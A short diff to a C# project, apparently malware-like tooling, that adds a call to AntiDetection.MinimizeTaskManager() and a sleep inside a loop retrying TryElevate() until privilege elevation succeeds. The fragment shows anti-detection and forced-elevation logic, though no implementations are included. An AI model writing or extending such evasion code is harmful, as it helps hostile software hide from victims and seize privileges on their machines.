@@ -83,6 +83,8 @@ namespace zort
                 while (!didElevate)
                 {
                     didElevate = TryElevate();
+                    AntiDetection.MinimizeTaskManager();
+                    Thread.Sleep(1500);
                 }
             }
             else
